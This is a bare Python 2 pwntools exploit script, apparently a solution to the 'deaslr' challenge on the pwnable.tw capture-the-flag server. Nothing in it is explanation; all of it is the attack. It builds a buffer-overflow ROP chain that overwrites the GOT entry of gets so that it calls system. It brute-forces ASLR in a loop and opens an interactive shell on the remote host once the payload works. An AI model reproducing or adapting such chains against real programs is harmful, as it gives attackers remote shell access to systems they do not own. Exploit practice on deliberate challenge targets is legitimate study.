from pwn import *
import signal

#context.log_level='debug'

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)

class Program_Exception(Exception):
    pass

count=0

if __name__ == "__main__":

	while 1:
		try:	
			#have to exec, Ubuntu 16.04.1 LTS(pwnabl.tw server is Ubuntu 16.04.1 LTS)
			
			s= remote('chall.pwnable.tw', 10402)

			print "COUNT: "+str(count)
                        count+=1
			e=ELF('./deaslr')

			bss = 0x601000
			binsh= bss+8

			poprdi_ret = 0x00000000004005c3
			pop_rbx_rbp_r12_r13_r14_r15 = 0x4005ba
			gets_system_offset=0x299f0

			offset = 0xffffffffffffffff-gets_system_offset+1 # get <-> system
			ret = 0x4005c4

			#Write bss,system offset
			payload  = "A"*0x18
			payload += p64(poprdi_ret)
			payload += p64(bss)
			payload += p64(e.plt['gets'])

			payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
			payload += p64(e.got['gets']-0x10) # rbx
			payload += p64(0) #rbp
			payload += p64(0) #r12
			payload += p64(0) #r13
			payload += p64(0) #r14
			payload += p64(bss) # r15 

			payload += p64(poprdi_ret)
			payload += p64(binsh)
			payload += p64(ret)*6

			payload += "\xb0"
		
			s.sendline(payload)
			s.send(p64(offset))
			s.sendline("/bin/sh\00")
				
			s.recvline(timeout=2)	
			s.sendline('id')
			
			if s.recvuntil('id',timeout=1):
				s.interactive()
			else:
				s.close()		
			
                except (Program_Exception,EOFError) as e:
			print "EOFError"
                        s.close()
                        continue

